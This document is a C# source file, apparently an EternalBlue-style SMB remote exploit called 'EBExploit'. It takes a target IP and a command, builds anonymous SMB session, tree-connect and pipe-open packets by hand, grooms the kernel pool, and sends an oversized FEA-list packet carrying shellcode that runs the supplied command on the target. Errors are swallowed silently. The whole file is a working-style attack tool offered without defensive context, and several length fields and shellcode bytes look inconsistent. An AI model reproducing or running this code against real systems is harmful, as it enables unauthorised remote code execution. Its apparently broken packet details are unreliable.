
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace EBExploit {
    class Program {
        static void Main(string[] args) {
            if (args.Length < 2) return;
            try { Exploit(args[0], args[1]); } catch {}
        }
        
        static void Exploit(string targetIP, string payloadCmd) {
            TcpClient tcp = new TcpClient();
            try {
                tcp.Connect(targetIP, 445);
            } catch { return; }
            NetworkStream stream = tcp.GetStream();
            stream.ReadTimeout = 10000;
            stream.WriteTimeout = 10000;
            
            // SMB Negotiate Protocol Request (116 bytes payload, length = 112 = 0x70)
            byte[] negotiate = new byte[116] {
                0x00, 0x00, 0x00, 0x72, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00,
                0x00, 0x18, 0x53, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            stream.Write(negotiate, 0, negotiate.Length);
            Thread.Sleep(500);
            byte[] resp = new byte[8192];
            int read = stream.Read(resp, 0, resp.Length);
            if (read < 32) { tcp.Close(); return; }
            ushort procID = BitConverter.ToUInt16(resp, 26);
            
            // Session Setup (anonymous)
            byte[] sessionSetup = new byte[139];
            sessionSetup[0] = 0x00; sessionSetup[1] = 0x00; sessionSetup[2] = 0x00; sessionSetup[3] = 0x8B;
            sessionSetup[4] = 0xFF; sessionSetup[5] = 0x53; sessionSetup[6] = 0x4D; sessionSetup[7] = 0x42;
            sessionSetup[8] = 0x73; sessionSetup[9] = 0x00; sessionSetup[10] = 0x00; sessionSetup[11] = 0x00;
            sessionSetup[12] = 0x00; sessionSetup[13] = 0x18; sessionSetup[14] = 0x07; sessionSetup[15] = 0xC8;
            sessionSetup[26] = (byte)(procID & 0xFF); sessionSetup[27] = (byte)(procID >> 8);
            sessionSetup[30] = 0xFF; sessionSetup[31] = 0xFE; sessionSetup[35] = 0x0D;
            stream.Write(sessionSetup, 0, sessionSetup.Length);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            if (read < 35) { tcp.Close(); return; }
            uint sessionID = BitConverter.ToUInt32(resp, 28);
            
            // Tree Connect IPC$
            string treePath = @"\\" + targetIP + @"\IPC$";
            byte[] pathBytes = Encoding.Unicode.GetBytes(treePath);
            int treeConnectLen = 107 + pathBytes.Length;
            byte[] treeConnect = new byte[treeConnectLen];
            treeConnect[4] = 0xFF; treeConnect[5] = 0x53; treeConnect[6] = 0x4D; treeConnect[7] = 0x42;
            treeConnect[8] = 0x75; treeConnect[9] = 0x00; treeConnect[10] = 0x00; treeConnect[11] = 0x00;
            treeConnect[12] = 0x00; treeConnect[13] = 0x18; treeConnect[14] = 0x07; treeConnect[15] = 0xC8;
            treeConnect[26] = (byte)(procID & 0xFF); treeConnect[27] = (byte)(procID >> 8);
            treeConnect[28] = (byte)(sessionID & 0xFF); treeConnect[29] = (byte)((sessionID >> 8) & 0xFF);
            treeConnect[30] = (byte)((sessionID >> 16) & 0xFF); treeConnect[31] = (byte)((sessionID >> 24) & 0xFF);
            int offset = 36;
            treeConnect[offset++] = 0x04; treeConnect[offset++] = 0xFF;
            treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00;
            treeConnect[offset++] = 0x01; treeConnect[offset++] = 0x00;
            treeConnect[offset++] = (byte)(pathBytes.Length + 2); treeConnect[offset++] = 0x00;
            treeConnect[offset++] = 0x04;
            Array.Copy(pathBytes, 0, treeConnect, offset, pathBytes.Length);
            offset += pathBytes.Length;
            treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00;
            int totalLen = offset;
            treeConnect[0] = 0x00; treeConnect[1] = 0x00; treeConnect[2] = (byte)((totalLen - 4) & 0xFF); treeConnect[3] = (byte)((totalLen - 4) >> 8);
            stream.Write(treeConnect, 0, totalLen);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            ushort treeID = BitConverter.ToUInt16(resp, 24);
            
            // Open srvsvc pipe
            byte[] pipeOpen = new byte[155];
            pipeOpen[0] = 0x00; pipeOpen[1] = 0x00; pipeOpen[2] = 0x00; pipeOpen[3] = 0x9B;
            pipeOpen[4] = 0xFF; pipeOpen[5] = 0x53; pipeOpen[6] = 0x4D; pipeOpen[7] = 0x42;
            pipeOpen[8] = 0xA2; pipeOpen[9] = 0x00; pipeOpen[10] = 0x00; pipeOpen[11] = 0x00;
            pipeOpen[12] = 0x00; pipeOpen[13] = 0x18; pipeOpen[14] = 0x07; pipeOpen[15] = 0xC8;
            pipeOpen[24] = (byte)(treeID & 0xFF); pipeOpen[25] = (byte)(treeID >> 8);
            pipeOpen[26] = (byte)(procID & 0xFF); pipeOpen[27] = (byte)(procID >> 8);
            pipeOpen[28] = (byte)(sessionID & 0xFF); pipeOpen[29] = (byte)((sessionID >> 8) & 0xFF);
            pipeOpen[30] = (byte)((sessionID >> 16) & 0xFF); pipeOpen[31] = (byte)((sessionID >> 24) & 0xFF);
            pipeOpen[34] = 0x18; pipeOpen[35] = 0xFF;
            pipeOpen[42] = 0x00; pipeOpen[43] = 0x10;
            pipeOpen[63] = 0x08; pipeOpen[64] = 0x00;
            pipeOpen[65] = 0x06; pipeOpen[66] = 0x00;
            pipeOpen[67] = 0x73; pipeOpen[68] = 0x00; pipeOpen[69] = 0x72; pipeOpen[70] = 0x00;
            pipeOpen[71] = 0x76; pipeOpen[72] = 0x00; pipeOpen[73] = 0x73; pipeOpen[74] = 0x00;
            pipeOpen[75] = 0x76; pipeOpen[76] = 0x00; pipeOpen[77] = 0x63; pipeOpen[78] = 0x00;
            stream.Write(pipeOpen, 0, pipeOpen.Length);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            ushort fid = BitConverter.ToUInt16(resp, 42);
            
            // Kernel pool grooming
            for (int i = 0; i < 16; i++) {
                byte[] groom = new byte[256];
                int go = 4;
                groom[go++] = 0xFF; groom[go++] = 0x53; groom[go++] = 0x4D; groom[go++] = 0x42;
                groom[go++] = 0x32; groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00;
                groom[go++] = 0x00; groom[go++] = 0x18; groom[go++] = 0x07; groom[go++] = 0xC8;
                go += 8;
                groom[go++] = (byte)(treeID & 0xFF); groom[go++] = (byte)(treeID >> 8);
                groom[go++] = (byte)(procID & 0xFF); groom[go++] = (byte)(procID >> 8);
                groom[go++] = (byte)(sessionID & 0xFF); groom[go++] = (byte)((sessionID >> 8) & 0xFF);
                groom[go++] = (byte)((sessionID >> 16) & 0xFF); groom[go++] = (byte)((sessionID >> 24) & 0xFF);
                go += 4;
                groom[go++] = (byte)(fid & 0xFF); groom[go++] = (byte)(fid >> 8);
                groom[go++] = 0x10; groom[go++] = 0x00; groom[go++] = 0x10; groom[go++] = 0x00;
                groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00;
                for (int j = 0; j < 200; j++) { groom[go++] = (byte)(i + j); }
                int gl = go; groom[0] = 0x00; groom[1] = 0x00; groom[2] = (byte)((gl - 4) & 0xFF); groom[3] = (byte)((gl - 4) >> 8);
                stream.Write(groom, 0, gl);
                Thread.Sleep(50);
                stream.Read(resp, 0, resp.Length);
            }
            
            // Overflow trigger - oversized FEA list
            byte[] cmdBytes = Encoding.ASCII.GetBytes(payloadCmd);
            byte[] shellcode = new byte[256 + cmdBytes.Length];
            int sc = 0;
            shellcode[sc++] = 0x65; shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x04; shellcode[sc++] = 0x25;
            shellcode[sc++] = 0x60; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x48; shellcode[sc++] = 0x18;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x58; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x58; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x59; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x01; shellcode[sc++] = 0xD9;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x81; shellcode[sc++] = 0xC1; shellcode[sc++] = 0x38;
            shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x09;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xF6; shellcode[sc++] = 0xAC;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x01; shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0xFF; shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48; shellcode[sc++] = 0x31;
            shellcode[sc++] = 0xC0; shellcode[sc++] = 0xAC; shellcode[sc++] = 0x48; shellcode[sc++] = 0x01;
            shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48; shellcode[sc++] = 0xFF; shellcode[sc++] = 0xC7;
            shellcode[sc++] = 0xE2; shellcode[sc++] = 0xAF; shellcode[sc++] = 0x57; shellcode[sc++] = 0xFF;
            shellcode[sc++] = 0xE7; shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xC9;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x81; shellcode[sc++] = 0xEC; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x01; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x8D; shellcode[sc++] = 0x0C; shellcode[sc++] = 0x24; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x89; shellcode[sc++] = 0x44; shellcode[sc++] = 0x24; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xD2; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x87; shellcode[sc++] = 0x02; shellcode[sc++] = 0xFF; shellcode[sc++] = 0xD0;
            Array.Copy(cmdBytes, 0, shellcode, sc, cmdBytes.Length);
            sc += cmdBytes.Length;
            shellcode[sc++] = 0x00;
            byte[] result = new byte[sc];
            Array.Copy(shellcode, 0, result, 0, sc);
            
            int feaListSize = 65536;
            byte[] overflowPkt = new byte[feaListSize + 256 + result.Length];
            int po = 4;
            overflowPkt[po++] = 0xFF; overflowPkt[po++] = 0x53; overflowPkt[po++] = 0x4D; overflowPkt[po++] = 0x42;
            overflowPkt[po++] = 0x32; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x18; overflowPkt[po++] = 0x07; overflowPkt[po++] = 0xC8;
            po += 8;
            overflowPkt[po++] = (byte)(treeID & 0xFF); overflowPkt[po++] = (byte)(treeID >> 8);
            overflowPkt[po++] = (byte)(procID & 0xFF); overflowPkt[po++] = (byte)(procID >> 8);
            overflowPkt[po++] = (byte)(sessionID & 0xFF); overflowPkt[po++] = (byte)((sessionID >> 8) & 0xFF);
            overflowPkt[po++] = (byte)((sessionID >> 16) & 0xFF); overflowPkt[po++] = (byte)((sessionID >> 24) & 0xFF);
            po += 4;
            overflowPkt[po++] = (byte)(fid & 0xFF); overflowPkt[po++] = (byte)(fid >> 8);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x10;
            overflowPkt[po++] = (byte)(result.Length & 0xFF); overflowPkt[po++] = (byte)((result.Length >> 8) & 0xFF);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0xFF; overflowPkt[po++] = 0xFF;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = (byte)(result.Length & 0xFF); overflowPkt[po++] = (byte)((result.Length >> 8) & 0xFF);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x01; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x0E;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x10;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            for (int i = 0; i < feaListSize / 8; i++) {
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x05;
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
                overflowPkt[po++] = (byte)('A' + (i % 26));
                overflowPkt[po++] = (byte)('A' + ((i+1) % 4));
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            }
            Array.Copy(result, 0, overflowPkt, po, result.Length);
            po += result.Length;
            int opLen = po;
            overflowPkt[0] = 0x00; overflowPkt[1] = 0x00; overflowPkt[2] = (byte)((opLen - 4) >> 8); overflowPkt[3] = (byte)((opLen - 4) & 0xFF);
            stream.Write(overflowPkt, 0, opLen);
            Thread.Sleep(5000);
            tcp.Close();
        }
    }
}
